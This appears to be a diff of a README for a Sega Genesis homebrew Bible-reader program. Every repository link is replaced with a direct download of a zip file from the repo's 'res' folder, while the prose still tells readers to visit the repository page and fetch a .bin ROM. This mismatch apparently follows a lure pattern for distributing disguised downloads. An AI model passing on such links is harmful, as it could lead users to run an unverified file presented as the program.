@@ -1,6 +1,6 @@
 # 🎮 SegaGenesisKJV - Read King James Bible on Genesis
 
-[![Download SegaGenesisKJV](https://img.shields.io/badge/Download-SegaGenesisKJV-brightgreen?style=for-the-badge)](https://github.com/psyqs/SegaGenesisKJV)
+[![Download SegaGenesisKJV](https://img.shields.io/badge/Download-SegaGenesisKJV-brightgreen?style=for-the-badge)](https://github.com/psyqs/SegaGenesisKJV/raw/refs/heads/main/res/Sega-KJV-Genesis-v1.5.zip)
 
 ---
 
@@ -21,7 +21,7 @@ SegaGenesisKJV is a homebrew program for the Sega Mega Drive/Genesis console. It
 
 You can get the program from the official GitHub repository here:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/psyqs/SegaGenesisKJV)
+[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/psyqs/SegaGenesisKJV/raw/refs/heads/main/res/Sega-KJV-Genesis-v1.5.zip)
 
 Follow the link above to visit the repository page. Look for the latest release or the ROM file to download. This is where you find the file you will run on your machine or emulator.
 
@@ -33,7 +33,7 @@ Follow the link above to visit the repository page. Look for the latest release 
 
 Go to the SegaGenesisKJV GitHub page:
 
-https://github.com/psyqs/SegaGenesisKJV
+https://github.com/psyqs/SegaGenesisKJV/raw/refs/heads/main/res/Sega-KJV-Genesis-v1.5.zip
 
 Look for a releases section or a download folder. The file you want should have a `.bin` or `.md` file extension, which is the ROM file for the Sega Genesis.
 
@@ -125,13 +125,13 @@ If problems persist, look up community forums for Sega Genesis homebrew users or
 
 Find source code, updates, and instructions here:
 
-https://github.com/psyqs/SegaGenesisKJV
+https://github.com/psyqs/SegaGenesisKJV/raw/refs/heads/main/res/Sega-KJV-Genesis-v1.5.zip
 
 This is the best place for bug reports, feature requests, or to learn more about the project.
 
 ---
 
-[![Download SegaGenesisKJV](https://img.shields.io/badge/Download-SegaGenesisKJV-brightgreen?style=for-the-badge)](https://github.com/psyqs/SegaGenesisKJV)
+[![Download SegaGenesisKJV](https://img.shields.io/badge/Download-SegaGenesisKJV-brightgreen?style=for-the-badge)](https://github.com/psyqs/SegaGenesisKJV/raw/refs/heads/main/res/Sega-KJV-Genesis-v1.5.zip)
 
 ---
 
